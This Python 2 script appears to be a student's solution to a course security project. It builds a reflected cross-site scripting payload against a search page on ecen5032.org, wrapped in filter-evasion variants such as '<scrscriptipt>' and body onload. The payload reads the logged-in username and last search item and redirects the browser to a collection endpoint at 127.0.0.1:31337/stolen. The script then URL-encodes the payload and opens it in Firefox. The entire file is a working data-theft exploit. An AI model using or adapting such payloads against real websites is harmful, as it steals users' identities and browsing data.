import httplib, urlparse, sys
import webbrowser


search_url = "http://ecen5032.org/project2/search?q="

#replacement hex for javascript injection
dict_replace = {
" ":"%20",
"<":"%3C",
"#":"%23",
";":"%0A",
"'":"`"
}

#different attack vectors for each level
attack_rap =[
["<script>", "</script>"],
['<body onload="','">'],
["<scrscriptipt>", "</scrscriptipt> "]]

#arms payload by replacing illegal operators from package
def arm_payload(payload):
    payload = reduce(lambda x, y: x.replace(y, dict_replace[y]), dict_replace, payload)
    return payload

#puts all the commands into a package with attack vector wrapping
def make_the_rap(command, attack_type):

    package = attack_rap[attack_type][0]
    for i in command:
        package += i
        package += ';'

    package += attack_rap[attack_type][1]
    return package


def main():
    print "hacking the gibson"
    command = []

    #set a timeout to load page fully
    #need to put everything else in a function
    command.append("setTimeout(function() {")

    #find the username
    command.append("var a = $('span#logged-in-user').html()")

    #find the last search history #fixed with timeout
    command.append("var b = $('a.history-item.list-group-item').next().html()")

    #create the html seed and append stolen data
    command.append("var html_seed = 'http://127.0.0.1:31337/stolen?user='")

    #append the username and last search
    command.append("html_seed = html_seed.concat(a)")#'&last_search='+b)")
    command.append("html_seed = html_seed.concat('%26last_search=')")
    command.append("html_seed = html_seed.concat(b)")

    #test code to show proper html demo
    #command.append("alert(html_seed)")
    #command.append("$.get(html_seed)")

    #send the package!!
    command.append("window.location.href = html_seed")

    #close delay
    command.append("}, 500)")

    #create package from commands SET THE COMMAND VECTOR
    package =  make_the_rap(command, 0)

    #arm the payload and attack url
    attack_url = search_url +  arm_payload(package)

    print attack_url

    #send the malicious website
    webbrowser.get('firefox').open(attack_url)


if __name__ == '__main__':
    main()
